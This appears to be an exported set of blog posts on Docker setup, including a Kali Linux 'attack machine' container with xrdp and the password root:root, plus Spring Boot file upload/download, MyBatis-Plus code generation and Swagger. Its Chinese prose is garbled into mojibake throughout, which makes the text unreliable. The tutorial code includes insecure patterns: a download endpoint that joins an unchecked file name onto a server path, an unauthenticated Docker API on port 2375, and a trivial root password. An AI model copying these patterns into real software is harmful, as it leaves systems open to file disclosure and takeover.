·æ‰èƒ½å®ç°è¿œç¨‹é€šä¿¡ å½“å¼€å¯è¿œç¨‹è®¿é—®åï¼Œå¯ä»¥å†æµè§ˆå™¨ä¸­æŸ¥çœ‹dockeræœåŠ¡å™¨ä¸Šçš„ç›¸å…³ä¿¡æ¯ï¼Œå¹¶ä¸”è¯¥APIéµå¾ªRESTful APIæ ‡å‡† æŸ¥çœ‹å½“å‰ç‰ˆæœ¬ï¼šhttp://IP:2375/version æŸ¥çœ‹æ‰€æœ‰é•œåƒä¿¡æ¯ï¼šhttp://IP:2375/images/json æŸ¥çœ‹å·²å¯åŠ¨å®¹å™¨ä¿¡æ¯ï¼šhttp://127.0.0.1:2375/containers/json æŸ¥çœ‹ç½‘å¡ä¿¡æ¯ï¼š http://127.0.0.1:2375/networks/ é‡åˆ°çš„é—®é¢˜Docker Desktopä¸VMå†²çªéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå®‰è£…Docker Desktop åVMå°±æ— æ³•ä½¿ç”¨ï¼ŒåŸå› ï¼š 1ã€Device Guardæˆ–Credential Guardä¸Workstationä¸å…¼å®¹ã€‚ 2ã€Windowsç³»ç»Ÿçš„Hyper-Vä¸å…¼å®¹å¯¼è‡´ è§£å†³æ–¹æ³•å¦‚https://blog.csdn.net/qq_36761831/article/details/81175736 å¼€å¯å’Œå…³é—­Hyper-V bcdedit /set hypervisorlaunchtype auto bcdedit /set hypervisorlaunchtype off å½“éœ€è¦ä½¿ç”¨VMæ—¶ï¼Œæ‰§è¡Œå…³é—­Hyper-Vå‘½ä»¤å³å¯ é…ç½®å›½å†…é•œåƒæºsettings=&gt;Dokcer engineä¿®æ”¹é…ç½®å†…å®¹ &#123; &quot;builder&quot;: &#123; &quot;gc&quot;: &#123; &quot;defaultKeepStorage&quot;: &quot;20GB&quot;, &quot;enabled&quot;: true &#125; &#125;, &quot;experimental&quot;: false, &quot;features&quot;: &#123; &quot;buildkit&quot;: true &#125;, &quot;registry-mirrors&quot;: [ &quot;https://registry.docker-cn.com&quot;, &quot;http://hub-mirror.c.163.com&quot;, &quot;https://docker.mirrors.ustc.edu.cn&quot; ] &#125; dockeré…ç½®è½¯é“¾æ¥ç”±äºDocker Desktopé»˜è®¤å®‰è£…åœ¨Cç›˜ï¼Œæ‰€ä»¥ä¸‹è½½çš„é•œåƒä¹Ÿéƒ½ä¿å­˜åœ¨Cç›˜ï¼Œç”±äºé•œåƒæ–‡ä»¶ä¸€èˆ¬å¾ˆå¤§ï¼Œå¾ˆå®¹æ˜“çˆ†ç›˜ï¼Œæ‰€ä»¥éœ€è¦ä¸ºä¿å­˜é•œåƒçš„æ–‡ä»¶å¤¹åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼Œå°†é•œåƒä¿å­˜åˆ°å…¶ä»–ç›˜ã€‚å‚è€ƒ è¯·åŠ¡å¿…å…ˆå…³é—­docker æˆ–è€…docker desktop é€šè¿‡Everythingæˆ–è€…èµ„æºç®¡ç†å™¨æ‰¾åˆ°ä»¥.vhdxç»“å°¾çš„æ–‡ä»¶æ‰€åœ¨çš„ä½ç½®ï¼Œè¿™äº›å°±æ˜¯dockeré•œåƒè·¯å¾„ï¼š å°†.vhdxå¤åˆ¶åˆ°æƒ³è¦çš„è·¯å¾„ä¸‹ï¼Œæœ¬æ–‡è·¯å¾„ä¸ºï¼š åˆ é™¤æºæ–‡ä»¶å¤¹ï¼Œæœ¬æ–‡æ˜¯dataæ–‡ä»¶å¤¹ ä»¥ç®¡ç†å‘˜è¿è¡Œcmdå¹¶ä¸”ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åˆ›å»ºé“¾æ¥ï¼š mklink /J C:\\Users\\admin\\AppData\\Local\\Docker\\wsl\\data D:\\docker\\data è¯·å¤§å®¶è‡ªè¡Œæ›¿æ¢è·¯å¾„ï¼Œæœ¬æ–‡è·¯å¾„åˆ†åˆ«ä¸ºæºè·¯å¾„ï¼šC:\\Users\\admin\\AppData\\Local\\Docker\\wsl\\data ä»¥åŠæƒ³è¦ç§»åŠ¨çš„è·¯å¾„ï¼šD:\\docker\\dataæ­¤æ—¶å¯ä»¥åœ¨æºè·¯å¾„çœ‹åˆ°æ–°å»ºå‡ºæ¥çš„æ–‡ä»¶å¤¹ ä½¿ç”¨dockerpyå®˜æ–¹ç»™å‡ºäº†è¯¦ç»†çš„è¯´æ˜æ–‡æ¡£è¯´æ˜æ–‡æ¡£ï¼Œä¸‹é¢åªç»™å‡ºå‡ ä¸ªå¸¸è§çš„æ“ä½œ imageç›¸å…³æ“ä½œè¿›å…¥dockeråº“çš„imges.pyä¸­å¯ä»¥çœ‹åˆ°ä¸é•œåƒç›¸å…³çš„æ‰€æœ‰æ“ä½œï¼ŒåŒ…æ‹¬åœ¨shellä¸­ä½¿ç”¨çš„buildã€pullã€pushã€searchç­‰æ“ä½œ list()æŸ¥çœ‹æºç ï¼Œå¯çŸ¥æœ‰ä¸‰ä¸ªå¯é€‰å‚æ•° def list(self, name=None, all=False, filters=None): &quot;&quot;&quot; List images on the server. Args: name (str): Only show images belonging to the repository ``name`` all (bool): Show intermediate image layers. By default, these are filtered out. filters (dict): Filters to be processed on the image list. Available filters: - ``dangling`` (bool) - ``label`` (str): format either ``key`` or ``key=value`` Returns: (list of :py:class:`Image`): The images. Raises: :py:class:`docker.errors.APIError` If the server returns an error. &quot;&quot;&quot; resp = self.client.api.images(name=name, all=all, filters=filters) return [self.get(r[&quot;Id&quot;]) for r in resp] è·å–æ‰€æœ‰é•œåƒimport docker client = docker.from_env() imagesList = client.images.list() print(imagesList) get()è¯¥å‡½æ•°åªæœ‰ä¸€ä¸ªå‚æ•°nameï¼Œé•œåƒåç§° è·å–æŒ‡å®šåç§°çš„é•œåƒ import docker client = docker.from_env() mysqlImage = client.images.get(&quot;mysql&quot;) print(mysqlImage) search()ä¸docker search å‘½ä»¤ç›¸åŒ searchList = client.images.search(&quot;nginx&quot;) print(searchList) pull()ä½œç”¨ç­‰åŒäºdocker pull client.images.pull(&quot;nginx&quot;) containerç›¸å…³æ“ä½œå®¹å™¨ç›¸å…³çš„æ“ä½œå¾ˆå¤š run()å®˜æ–¹æ³¨é‡Š Run a container. By default, it will wait for the container to finish and return its logs, similar to ``docker run``. // If the ``detach`` argument is ``True``, it will start the container and immediately return a :py:class:`Container` object, similar to ``docker run -d``. port_dict = &#123;&#x27;2222/tcp&#x27;: 3333&#125; image_name = nginx client.containers.run(image_name, ports=port_dict, detach=True) # ä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼åˆ›å»ºå®¹å™¨ï¼Œå®¹å™¨åœæ­¢åä¸ä¼šåˆ é™¤ ``` - The port number, as an integer. For example, ``&#123;&#x27;2222/tcp&#x27;: 3333&#125;`` will expose port 2222 inside the container as port 3333 on the host. - ``None``, to assign a random host port. For example, ``&#123;&#x27;2222/tcp&#x27;: None&#125;``. - A tuple of ``(address, port)`` if you want to specify the host interface. For example, ``&#123;&#x27;1111/tcp&#x27;: (&#x27;127.0.0.1&#x27;, 1111)&#125;``. - A list of integers, if you want to bind multiple host ports to a single container port. For example, ``&#123;&#x27;1111/tcp&#x27;: [1234, 4567]&#125;``. ``` get()è·å–å®¹å™¨å¯¹è±¡ docker_container_id = &quot;236efe761aeb&quot; container = client.containers.get(docker_container_id) print(container.id) print(container.attrs) # è·å–å®¹å™¨çš„è¯¦ç»†ä¿¡æ¯ exec()è¿›å…¥å®¹å™¨å†…éƒ¨æ‰§è¡Œå‘½ä»¤ï¼Œä¸ä¸‹é¢çš„å‘½ä»¤ä½œç”¨ç›¸åŒ docker exec -it containerID bash command = &#x27;touch /tmp/flag&#x27; port_dict = &#123;&#x27;2222/tcp&#x27;: 3333&#125; image_name = nginx container = client.containers.run(image_name, ports=port_dict, detach=True) container.exec_run(command) networkç›¸å…³æ“ä½œcreateä½¿ç”¨é»˜è®¤å‚æ•°ï¼Œæ¡¥æ¥æ¨¡å¼åˆ›å»ºç½‘å¡ client.networks.create(&quot;net1&quot;, driver=&quot;bridge&quot;) ä½¿ç”¨è‡ªå®šä¹‰IPAMé…ç½®åˆ›å»ºæ›´é«˜çº§çš„ç½‘ç»œã€‚ä¾‹å¦‚ï¼Œå°†å­ç½‘è®¾ç½®ä¸º192.168.52.0/24å’Œç½‘å…³åœ°å€ä¸º192.168.52.254 ipam_pool = docker.types.IPAMPool( subnet=&#x27;192.168.52.0/24&#x27;, gateway=&#x27;192.168.52.254&#x27; ) ipam_config = docker.types.IPAMConfig( pool_configs=[ipam_pool] ) client.networks.create( &quot;network1&quot;, driver=&quot;bridge&quot;, ipam=ipam_config ) åˆ›å»ºkaliæ”»å‡»æœºé•œåƒä¸‹è½½é•œåƒdocker pull kalilinux/kali-rolling æŸ¥çœ‹ä¸‹è½½çš„é•œåƒ docker images å¯åŠ¨å®¹å™¨docker run -itd -p 3399:3389 kalilinux/kali-rolling /bin/bash æŸ¥çœ‹å®¹å™¨id docker ps è¿›å…¥å®¹å™¨ docker exec -it id bash å®‰è£…åŸºç¡€ç¯å¢ƒåŒ…â—éœ€è¦å…³é—­é˜²ç«å¢™æˆ–è€…æ‰“å¼€3399ç«¯å£ï¼Œå¦åˆ™æ— æ³•è¿æ¥ é¦–å…ˆå®‰è£…vim apt-get -y update &amp;&amp; apt-get -y upgrade apt-get update --fix-missing apt-get install vim ä¿®æ”¹é•œåƒæº vim /etc/apt/sources.list æ·»åŠ å†…å®¹ deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib å®‰è£…åŸºç¡€ç¯å¢ƒåŒ… apt-get -y update &amp;&amp; apt-get -y upgrade &amp;&amp; \\ DEBIAN_FRONTEND=noninteractive apt-get install -y \\ kali-tools-top10 \\ pciutils \\ iputils-ping \\ bash-completion &amp;&amp; \\ apt-get autoremove -y &amp;&amp; \\ apt-get clean ç”Ÿæˆæ–°é•œåƒå¾…ä¸Šé¢çš„æ‰€æœ‰ç¨‹åºå®‰è£…å®Œæˆåï¼Œæ‰“åŒ…ç”Ÿæˆæ–°é•œåƒ docker commit f16618e0fda5 kali-2021 è¿œç¨‹æ¡Œé¢ç¯å¢ƒå®‰è£…ä½¿ç”¨æ–°é•œåƒå¯åŠ¨å®¹å™¨docker run -itd -p 3399:3389 kali-2021 è¿›å…¥é•œåƒ docker exec -it id bash å®‰è£…æ¡Œé¢æœåŠ¡â— kali-desktop-xfce ï¼šå®‰è£…è¿œç¨‹æ¡Œé¢ç¯å¢ƒ â— xrdp ï¼šè¿œç¨‹æ¡Œé¢æœåŠ¡ â— xorgï¼šxorgæ˜¯x11çš„ä¸€ä¸ªå®ç°ï¼Œxorgæä¾›X server apt-get update apt-get -y install kali-desktop-xfce xorg xrdp é…ç½®xrdpå®ç°è¿œç¨‹è¿æ¥å›¾å½¢ç•Œé¢ï¼š sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini service xrdp restart ä¿®æ”¹rootç”¨æˆ·å¯†ç ï¼š passwd root echo root:root|chpasswd å†æ¬¡ç™»å½•XRDPï¼š æ‰“åŒ…é•œåƒdocker commit id docker-attack ç¼–å†™Dockerfileå› ä¸ºå¯åŠ¨å®¹å™¨åéœ€è¦è¿è¡Œ sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini service xrdp restart æ‰€æœ‰ä½¿ç”¨Dockerfileå®Œæˆè¿™ä¸¤æ­¥æ“ä½œ FROM kali-attack:latest COPY run.sh /home/run.sh RUN chmod +x /home/run.sh CMD [&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;/home/run.sh &amp;&amp; tail -f /dev/null&quot;] æ²¡æœ‰tail -f /dev/nullä¼šå¯¼è‡´å¯åŠ¨å®¹å™¨åè‡ªåŠ¨é€€å‡ºæ— æ³•ä½¿ç”¨ï¼ŒåŸå› å¯èƒ½å¦‚ä¸‹ run.shä¸­çš„å†…å®¹ï¼Œä¸ºå¯åŠ¨å®¹å™¨åéœ€è¦æ‰§è¡Œçš„ä¸¤æ¡å‘½ä»¤ #!/bin/bash sed -i &#x27;s/port=3399/port=3389/g&#x27; /etc/xrdp/xrdp.ini wait service xrdp restart ä½¿ç”¨ docker build -t kali-attack2 . åˆ›å»ºé•œåƒï¼Œä¹‹ååˆ›å»ºå®¹å™¨ docker run -itd -p 3399:3389 kali-attack2 è¿™æ ·å°±å¯ä»¥ç›´æ¥ä½¿ç”¨mstvc.exeè¿æ¥kaliæ¡Œé¢ username:root password:root dockerè®¿é—®å®¿ä¸»æœºç½‘ç»œèµ„æºè§£å†³æ–¹æ¡ˆ æœ¬æ–‡ä½¿ç”¨çš„çš„windows dockerç‰ˆæœ¬å¤§äº18.03å¯ä»¥ç›´æ¥ä½¿ç”¨host.docker.internalè®¿é—®å®¿ä¸»æœºç½‘ç»œèµ„æº å…¶ä»–æ“ä½œç³»ç»Ÿçš„å¯ä»¥å‚è€ƒ dockerå®¹å™¨å®‰è£…vimå‡ºé”™æŠ¥é”™ä¿¡æ¯å¦‚ä¸‹ ncurses-base : Breaks: libtinfo5 (&lt; 6.1) but 6.0+20161126-1+deb9u2 is to be installed E: Error, pkgProblemResolver::Resolve generated breaks, this may be caused by held packages. E: Unable to correct dependencies ç›´æ¥ä½¿ç”¨aptå®‰è£…æ­¤åŒ…å³å¯ apt update apt upgrade apt install vim","tags":[{"name":"docker","slug":"docker","permalink":"https://sunzhengyu99.github.io/tags/docker/"}]},{"title":"reggie","date":"2022-04-29T14:38:38.000Z","path":"2022/04/29/reggie/","text":"ç‘å‰å¤–å–é¡¹ç›®é»‘é©¬ç¨‹åºå‘˜æœ€æ–°çš„springbootè¯¾ç¨‹ä¸­çš„é¡¹ç›® é¡¹ç›®åœ°å€ä¸º ç‘å‰ ä»£ç å…¨æ˜¯è·Ÿç€è§†é¢‘æ•²å‡ºæ¥çš„ï¼Œåé¢ä¼šå¯¹é¡¹ç›®è¿›è¡Œä¼˜åŒ–ã€‚","tags":[{"name":"springboot","slug":"springboot","permalink":"https://sunzhengyu99.github.io/tags/springboot/"}]},{"title":"springbootå·¥å…·ç±»","date":"2022-04-29T13:45:52.000Z","path":"2022/04/29/springbooot-upload-file/","text":"javawebä¸­å›¾ç‰‡æ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ä½¿ç”¨springbootåˆ›å»ºwebé¡¹ç›® æœåŠ¡ç«¯è¦æ¥æ”¶å®¢æˆ·ç«¯é¡µé¢ä¸Šä¼ çš„æ–‡ä»¶ï¼Œé€šå¸¸éƒ½ä¼šä½¿ç”¨Apacheçš„ä¸¤ä¸ªç»„ä»¶: commons-fileupload commons-io Springæ¡†æ¶åœ¨spring-webåŒ…ä¸­å¯¹æ–‡ä»¶ä¸Šä¼ è¿›è¡Œäº†å°è£…ï¼Œå¤§å¤§ç®€åŒ–äº†æœåŠ¡ç«¯ä»£ç ï¼Œå®ç°æ­¥éª¤å¦‚ä¸‹ï¼š 1.åˆ›å»ºControllerå› ä¸ºå›¾ç‰‡ä¸Šä¼ æ˜¯ä¸€ä¸ªå…¬å…±æ¥å£æ‰€ä»¥å¯ä»¥åˆ›å»ºä¸€ä¸ªåä¸ºCommonControllerçš„æ–‡ä»¶ï¼Œurlåœ°å€ä¸º/common /** * ä¸»è¦ç”¨äºæ–‡ä»¶ä¸Šä¼ å’Œä¸‹è½½ */ @RestController @RequestMapping(&quot;/common&quot;) public class CommonController &#123; @Value(&quot;$&#123;reggie.path&#125;&quot;) // ä¿å­˜å›¾ç‰‡çš„è·¯å¾„ private String basePath; &#125; ä¸Šä¼ å›¾ç‰‡/** * æ–‡ä»¶ä¸Šä¼  * @param file * @return */ @PostMapping(&quot;/upload&quot;) public R&lt;String&gt; upload(MultipartFile file)&#123; // fileæ˜¯ä¸€ä¸ªä¸´æ—¶æ–‡ä»¶ï¼Œåç»­éœ€è¦è¿›è¡Œè½¬å­˜ // fileéœ€è¦ä¸å‰ç«¯ä¸Šä¼ çš„å‚æ•°åä¿æŒä¸€è‡´ï¼Œå¦åˆ™æ— æ³•è·å–åˆ°ä¸Šä¼ çš„æ–‡ä»¶ // è½¬å­˜ä¹‹å‰éœ€è¦å¯¹æ–‡ä»¶åè¿›è¡Œå¤„ç† String originalFilename = file.getOriginalFilename(); String suffix = originalFilename.substring(originalFilename.lastIndexOf(&quot;.&quot;)); // é˜²æ­¢æ–‡ä»¶è¢«è¦†ç›–ï¼Œä½¿ç”¨uuidä½œä¸ºæ–‡ä»¶å String filename = UUID.randomUUID().toString(); filename = filename + suffix; File dir = new File(basePath); // åˆ¤æ–­æ–‡ä»¶å¤¹æ˜¯å¦å­˜åœ¨ä¸å­˜åœ¨åˆ™åˆ›å»º if (!dir.exists())&#123; dir.mkdir(); &#125; // å°†å›¾ç‰‡ä¿å­˜çš„æŒ‡å®šä½ç½® try &#123; file.transferTo(new File(basePath + filename)); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; return R.success(filename); &#125; ä¸‹è½½å›¾ç‰‡@GetMapping(&quot;/download&quot;) public void download(String name, HttpServletResponse response) throws IOException &#123; // æ–‡ä»¶è¾“å…¥æµè¯»å–æœ¬åœ°æ–‡ä»¶ FileInputStream fileInputStream = null; // ä½¿ç”¨å“åº”è¾“å‡ºæµå°†å›¾ç‰‡æ˜¾ç¤ºåœ¨ç½‘é¡µä¸Š ServletOutputStream outputStream = null; try &#123; fileInputStream = new FileInputStream(new File(basePath + name)); outputStream = response.getOutputStream(); response.setContentType(&quot;image/jpeg&quot;); byte[] bytes = new byte[1024]; int len = 0; // è¯»å–æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡å ç”±å“åº”è¾“å‡ºæµ while( (len = fileInputStream.read(bytes)) != -1)&#123; outputStream.write(bytes, 0, len); outputStream.flush(); &#125; &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; finally &#123; fileInputStream.close(); outputStream.close(); &#125; &#125; 2.å‰ç«¯é¡µé¢&lt;!DOCTYPE html&gt; &lt;html lang=&quot;en&quot;&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;æ–‡ä»¶ä¸Šä¼ &lt;/title&gt; &lt;!-- å¼•å…¥æ ·å¼ --&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../plugins/element-ui/index.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../styles/common.css&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;../../styles/page.css&quot; /&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;addBrand-container&quot; id=&quot;food-add-app&quot;&gt; &lt;div class=&quot;container&quot;&gt; &lt;el-upload class=&quot;avatar-uploader&quot; action=&quot;/common/upload&quot; :show-file-list=&quot;false&quot; :on-success=&quot;handleAvatarSuccess&quot; :before-upload=&quot;beforeUpload&quot; ref=&quot;upload&quot;&gt; &lt;img v-if=&quot;imageUrl&quot; :src=&quot;imageUrl&quot; class=&quot;avatar&quot;&gt;&lt;/img&gt; &lt;i v-else class=&quot;el-icon-plus avatar-uploader-icon&quot;&gt;&lt;/i&gt; &lt;/el-upload&gt; &lt;/div&gt; &lt;/div&gt; &lt;!-- å¼€å‘ç¯å¢ƒç‰ˆæœ¬ï¼ŒåŒ…å«äº†æœ‰å¸®åŠ©çš„å‘½ä»¤è¡Œè­¦å‘Š --&gt; &lt;script src=&quot;../../plugins/vue/vue.js&quot;&gt;&lt;/script&gt; &lt;!-- å¼•å…¥ç»„ä»¶åº“ --&gt; &lt;script src=&quot;../../plugins/element-ui/index.js&quot;&gt;&lt;/script&gt; &lt;!-- å¼•å…¥axios --&gt; &lt;script src=&quot;../../plugins/axios/axios.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;../../js/index.js&quot;&gt;&lt;/script&gt; &lt;script&gt; new Vue(&#123; el: &#x27;#food-add-app&#x27;, data() &#123; return &#123; imageUrl: &#x27;&#x27; &#125; &#125;, methods: &#123; handleAvatarSuccess (response, file, fileList) &#123; this.imageUrl = `/common/download?name=$&#123;response.data&#125;` &#125;, beforeUpload (file) &#123; if(file)&#123; const suffix = file.name.split(&#x27;.&#x27;)[1] const size = file.size / 1024 / 1024 &lt; 2 if([&#x27;png&#x27;,&#x27;jpeg&#x27;,&#x27;jpg&#x27;].indexOf(suffix) &lt; 0)&#123; this.$message.error(&#x27;ä¸Šä¼ å›¾ç‰‡åªæ”¯æŒ pngã€jpegã€jpg æ ¼å¼ï¼&#x27;) this.$refs.upload.clearFiles() return false &#125; if(!size)&#123; this.$message.error(&#x27;ä¸Šä¼ æ–‡ä»¶å¤§å°ä¸èƒ½è¶…è¿‡ 2MB!&#x27;) return false &#125; return file &#125; &#125; &#125; &#125;) &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; mybatis-plus-generatorMPçš„ä»£ç ç”Ÿæˆå™¨ï¼Œå¯ä»¥èŠ‚çº¦åˆ›å»ºæ–‡ä»¶çš„æ—¶é—´ 1.å¯¼å…¥ä¾èµ–&lt;!--ä»£ç ç”Ÿæˆå™¨--&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-generator&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt; &lt;/dependency&gt; 2.ç¼–å†™ç”Ÿæˆå™¨ä»£ç å¯ä»¥æ”¾åœ¨ä¸“é—¨çš„å·¥å…·ç±»åŒ…ä¸‹ package com.sunzy.utils; import com.baomidou.mybatisplus.generator.FastAutoGenerator; import com.baomidou.mybatisplus.generator.config.OutputFile; import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine; import java.util.Collections; /** * mpä»£ç ç”Ÿæˆå™¨ */ public class CodeGenreator &#123; public static void main(String[] args) &#123; generator(); &#125; public static void generator()&#123; FastAutoGenerator.create(&quot;jdbc:mysql://localhost:3306/admin_demo?serverTimezone=Asia/Shanghai&amp;useUnicode=true&amp;characterEncoding=utf-8&amp;zeroDateTimeBehavior=convertToNull&amp;useSSL=false&amp;allowPublicKeyRetrieval=true&quot;, &quot;username&quot;, &quot;password&quot;) .globalConfig(builder -&gt; &#123; builder.author(&quot;sunzy&quot;) // è®¾ç½®ä½œè€… .enableSwagger() // å¼€å¯ swagger æ¨¡å¼ .fileOverride() // è¦†ç›–å·²ç”Ÿæˆæ–‡ä»¶ .outputDir(&quot;E:\\\\Sunzh\\\\java\\\\admin_demo\\\\src\\\\main\\\\java\\\\&quot;); // æŒ‡å®šè¾“å‡ºç›®å½• &#125;) .packageConfig(builder -&gt; &#123; builder.parent(&quot;com.sunzy&quot;) // è®¾ç½®çˆ¶åŒ…å .moduleName(&quot;&quot;) // è®¾ç½®çˆ¶åŒ…æ¨¡å—å .pathInfo(Collections.singletonMap(OutputFile.xml, &quot;E:\\\\Sunzh\\\\java\\\\admin_demo\\\\src\\\\main\\\\resources\\\\mapper\\\\&quot;)); // è®¾ç½®mapperXmlç”Ÿæˆè·¯å¾„ OutputEile.xmlè¿™é‡Œå¯èƒ½ä¼šæŠ¥é”™ æ ¹æ®ç‰ˆæœ¬ä¿®æ”¹ &#125;) .strategyConfig(builder -&gt; &#123; builder.entityBuilder().enableLombok(); builder.mapperBuilder().enableMapperAnnotation().build(); builder.controllerBuilder().enableHyphenStyle() // è¿å­—ç¬¦è½¬é©¼å³° .enableRestStyle(); // å¼€å¯restæ§åˆ¶å™¨ builder.addInclude(&quot;sys_user&quot;) // è®¾ç½®éœ€è¦ç”Ÿæˆçš„è¡¨å .addTablePrefix(&quot;t_&quot;, &quot;sys_&quot;); // è®¾ç½®è¿‡æ»¤è¡¨å‰ç¼€ &#125;) // .templateEngine(new FreemarkerTemplateEngine()) // ä½¿ç”¨Freemarkerå¼•æ“æ¨¡æ¿ï¼Œé»˜è®¤çš„æ˜¯Velocityå¼•æ“æ¨¡æ¿ .execute(); &#125; &#125; å®Œæˆåï¼Œç›´æ¥è¿è¡Œæ”¹å·¥å…·ç±»å°±å¯ä»¥ç›´æ¥ç”Ÿæˆä»¥ä¸‹æ–‡ä»¶ï¼š UserMapper.java IUserService.java UserServiceImpl.java UserController.java 3.Controlleræ¨¡æ¿å¯ä»¥æ ¹æ®éœ€è¦ä¿®æ”¹è‡ªå·±çš„æ¨¡æ¿ package $&#123;package.Controller&#125;; import com.baomidou.mybatisplus.extension.plugins.pagination.Page; import org.springframework.web.bind.annotation.*; import javax.annotation.Resource; import java.util.List; import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper; import $&#123;package.Service&#125;.$&#123;table.serviceName&#125;; import $&#123;package.Entity&#125;.$&#123;entity&#125;; #if($&#123;restControllerStyle&#125;) import org.springframework.web.bind.annotation.RestController; #else import org.springframework.stereotype.Controller; #end #if($&#123;superControllerClassPackage&#125;) import $&#123;superControllerClassPackage&#125;; #end /** * &lt;p&gt; * $!&#123;table.comment&#125; å‰ç«¯æ§åˆ¶å™¨ * &lt;/p&gt; * * @author $&#123;author&#125; * @since $&#123;date&#125; */ #if($&#123;restControllerStyle&#125;) @RestController #else @Controller #end @RequestMapping(&quot;#if($&#123;package.ModuleName&#125;)/$&#123;package.ModuleName&#125;#end/#if($&#123;controllerMappingHyphenStyle&#125;)$&#123;controllerMappingHyphen&#125;#else$&#123;table.entityPath&#125;#end&quot;) #if($&#123;kotlin&#125;) class $&#123;table.controllerName&#125;#if($&#123;superControllerClass&#125;) : $&#123;superControllerClass&#125;()#end #else #if($&#123;superControllerClass&#125;) public class $&#123;table.controllerName&#125; extends $&#123;superControllerClass&#125; &#123; #else public class $&#123;table.controllerName&#125; &#123; #end @Resource private $&#123;table.serviceName&#125; $&#123;table.entityPath&#125;Service; // æ–°å¢æˆ–è€…æ›´æ–° @PostMapping public boolean save(@RequestBody $&#123;entity&#125; $&#123;table.entityPath&#125;) &#123; return $&#123;table.entityPath&#125;Service.saveOrUpdate($&#123;table.entityPath&#125;); &#125; @DeleteMapping(&quot;/&#123;id&#125;&quot;) public Boolean delete(@PathVariable Integer id) &#123; return $&#123;table.entityPath&#125;Service.removeById(id); &#125; @PostMapping(&quot;/del/batch&quot;) public boolean deleteBatch(@RequestBody List&lt;Integer&gt; ids) &#123; return $&#123;table.entityPath&#125;Service.removeById(ids); &#125; @GetMapping public List&lt;$&#123;entity&#125;&gt; findAll() &#123; return $&#123;table.entityPath&#125;Service.list(); &#125; @GetMapping(&quot;/&#123;id&#125;&quot;) public $&#123;entity&#125; findOne(@PathVariable Integer id) &#123; return $&#123;table.entityPath&#125;Service.getById(id); &#125; @GetMapping(&quot;/page&quot;) public Page&lt;$&#123;entity&#125;&gt; findPage(@RequestParam Integer pageNum, @RequestParam Integer pageSize) &#123; LambdaQueryWrapper&lt;$&#123;entity&#125;&gt; queryWrapper = new LambdaQueryWrapper&lt;&gt;(); queryWrapper.orderByDesc(&quot;id&quot;); return $&#123;table.entityPath&#125;Service.page(new Page&lt;&gt;(pageNum, pageSize), queryWrapper); &#125; &#125; #end æ›´å¤šçš„æ¨¡æ¿å¯ä»¥åˆ°com.baomidou.mybatis-plus-generatoråŒ…ä¸­å¤åˆ¶åˆ°é¡¹ç›®çš„resources\\templatesä¸­ï¼Œæ ¹æ®è‡ªå·±çš„éœ€æ±‚ä¿®æ”¹æ¨¡æ¿ Swagger1.å¯¼å…¥ä¾èµ–&lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;io.springfox&lt;/groupId&gt; &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt; &lt;version&gt;2.9.2&lt;/version&gt; &lt;/dependency&gt; 2.åˆ›å»ºé…ç½®ç±»å†com.sunzy.fmmall.config.SwaggerConfigè·¯å¾„ä¸‹åˆ›å»ºswaggerçš„é…ç½®ç±» é…ç½®æ–‡æ¡£çš„å°é¢ä¿¡æ¯ åŒ…æ‹¬æ ‡é¢˜ï¼Œç‰ˆæœ¬ï¼Œä½œè€…ä¿¡æ¯ ä¿®æ”¹éœ€è¦æ‰«é¢çš„controlleråŒ…ä½ç½®å³å¯ package com.sunzy.fmmall.config; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; import springfox.documentation.builders.ApiInfoBuilder; import springfox.documentation.builders.PathSelectors; import springfox.documentation.builders.RequestHandlerSelectors; import springfox.documentation.service.ApiInfo; import springfox.documentation.service.Contact; import springfox.documentation.spi.DocumentationType; import springfox.documentation.spring.web.plugins.Docket; import springfox.documentation.swagger2.annotations.EnableSwagger2; @Configuration @EnableSwagger2 public class SwaggerConfig &#123; /** * swaggerå¯ä»¥è‡ªåŠ¨ç”Ÿæˆæ¥å£æ–‡æ¡£ * 1.é…ç½®ç”Ÿæˆæ–‡æ¡£çš„ä¿¡æ¯ * 2.é…ç½®ç”Ÿæˆè§„åˆ™ * */ /** * Docketç”¨æ¥å°è£…æ¥å£æ–‡æ¡£ * * @return */ @Bean public Docket getDocket()&#123; //åˆ›å»ºå°é¢ä¿¡æ¯å¯¹è±¡ ApiInfoBuilder apiInfoBuilder = new ApiInfoBuilder(); apiInfoBuilder.title(&quot;ã€Šé”‹è¿·å•†åŸã€‹åç«¯æ¥å£è¯´æ˜&quot;) 